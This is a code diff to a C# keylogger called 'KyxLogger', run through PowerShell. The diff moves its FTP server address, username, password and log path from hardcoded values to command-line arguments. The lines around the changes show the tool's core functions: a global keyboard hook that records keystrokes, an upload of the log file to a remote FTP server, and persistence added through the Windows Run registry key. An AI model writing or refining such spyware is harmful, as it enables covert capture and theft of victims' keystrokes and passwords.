@@ -11,20 +11,21 @@ namespace KL
 {
     public static class Program
     {
-        private static string logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Log.txt");
-        private static string ftpAddress = "ftp://yourftpserver.com/upload/Log.txt"; // Set your FTP server address
-        private static string ftpUsername = "yourUsername"; // Your FTP username
-        private static string ftpPassword = "yourPassword"; // Your FTP password
+        private static string logFilePath;
+        private static string ftpAddress;
+        private static string ftpUsername;
+        private static string ftpPassword;
 
         private static HookProc hookProc = HookCallback;
         private static IntPtr hookId = IntPtr.Zero;
 
         private static int keysPressedCount = 0;
 
-        public static void Main() 
+        public static void Main(string[] args) 
         {
+            ParseArgs(args);
             InitLog();
-            Console.WriteLine("kyxLogger by @xtlab ;)");
+            Console.WriteLine("KyxLogger by @Felony ;)");
                         
             hookId = SetHook(hookProc);
             Application.Run();
@@ -33,6 +34,20 @@ namespace KL
             UploadLogToFtp(logFilePath);
             Console.WriteLine("Total keys pressed: " + CountKeysPressed());
             DisplayLogContents();
+        }
+
+        private static void ParseArgs(string[] args)
+        {
+            if (args.Length < 4)
+            {
+                Console.WriteLine("Usage: [logFilePath] [ftpAddress] [ftpUsername] [ftpPassword]");
+                Environment.Exit(1);
+            }
+
+            logFilePath = args[0];
+            ftpAddress = args[1];
+            ftpUsername = args[2];
+            ftpPassword = args[3];
         }
 
         private static void InitLog()
@@ -105,7 +120,7 @@ namespace KL
         {
             try
             {
-                string appName = "kyxLogger";
+                string appName = "KyxLogger";
                 string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                 RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                 registryKey.SetValue(appName, exePath);
@@ -132,5 +147,5 @@ namespace KL
 }
 "@ -ReferencedAssemblies System.Windows.Forms, System.Net, Microsoft.Win32
 
-[KL.Program]::Main();
+[KL.Program]::Main($args);
 [KL.Program]::AddToStartup(); // Call to add to startup
